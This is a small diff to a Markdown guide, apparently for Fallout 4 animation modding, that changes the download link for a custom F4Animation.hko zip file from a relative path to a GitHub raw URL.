@@ -7,7 +7,7 @@
 ##Required Files
 
 
-[Custom F4Animation.hko](/fallout-4/file/F4Animation.zip)
+[Custom F4Animation.hko](https://github.com/ballerfuturistic/sfmnauts/raw/master/fallout-4/file/F4Animation.zip)
 download and unzip
 
 ### Table of Contents
